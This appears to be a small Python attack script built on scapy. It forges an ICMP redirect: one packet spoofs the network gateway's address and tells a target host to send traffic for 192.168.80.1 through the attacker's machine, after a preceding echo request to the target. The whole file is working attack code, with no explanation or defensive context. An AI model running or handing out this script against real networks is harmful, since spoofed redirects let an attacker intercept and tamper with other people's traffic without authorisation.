#!venv/bin/python

from scapy.all import *
from scapy.all import  IP, ICMP
import settings


"""
ICMP redirect
"""

# ONE WAY 
icmp_req = IP(src="192.168.80.1" ,dst=settings.destination_ip)/ICMP()
send(icmp_req, iface=settings.source_interface)

redirect = IP(src=settings.gateway, dst=settings.destination_ip)\
    /ICMP(type=5, code=1, gw=settings.source_ip)\
    /IP(src=settings.destination_ip, dst="192.168.80.1")\
    /ICMP(type=0, code=0)
send(redirect, iface=settings.source_interface)